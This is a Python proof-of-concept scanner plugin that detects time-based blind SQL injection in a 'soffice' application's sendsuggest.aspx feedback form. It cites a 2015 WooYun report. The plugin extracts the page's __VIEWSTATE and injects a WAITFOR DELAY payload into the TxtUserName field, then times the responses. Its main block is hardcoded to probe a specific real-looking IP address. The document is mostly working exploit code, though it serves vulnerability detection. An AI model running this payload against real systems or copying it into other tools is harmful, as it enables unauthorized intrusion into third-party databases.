#!/usr/bin/env python
#-*- coding: utf-8 -*-
#ref:http://www.wooyun.org/bugs/wooyun-2015-0146921
import re
import urllib,time

def assign(service, arg):
    if service == "soffice":
        return True, arg

def audit(arg):
    preWork = arg + 'advicemanage/sendsuggest.aspx'
    code, head, res, errcode, _ = curl.curl(preWork)
    if code != 200:
        return
    patten = re.findall(r'value=\"(?P<aa>[\w\+\/\=]{1,}?)\"',res)
    p1 = urllib.quote(patten[0])
    def make_raw(view_state,sleep_time):
        raw = '''
POST /advicemanage/sendsuggest.aspx HTTP/1.1
Host: localhost:800
Proxy-Connection: keep-alive
Content-Length: 207
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://localhost:800
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
Content-Type: application/x-www-form-urlencoded
DNT: 1
Referer: http://localhost:800/advicemanage/sendsuggest.aspx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8

__VIEWSTATE='''+view_state+'''&TxtUserName=asdasd');WAITFOR DELAY '0:0:'''+str(sleep_time)+''''--&TxtPhone=13012341234&TxtAddress=1+Llantwit+Street&TxtEmail=sadsd%40111.com&TxtTitle=sdasdasd&FCKContent=&IBSend.x=37&IBSend.y=11
        '''
        return raw
    code1, head, res, errcode, _ = curl.curl2(preWork,raw=make_raw(p1,1))
    timea = time.time()
    code2, head, res, errcode, _ = curl.curl2(preWork,raw=make_raw(p1,5))
    timeb = time.time()
    if code1==200 and code2==200 and timeb - timea > 4.5:
        security_hole(preWork)

if __name__ == '__main__':
    from dummy import *
    audit(assign("soffice", 'http://117.40.152.139:800/')[1])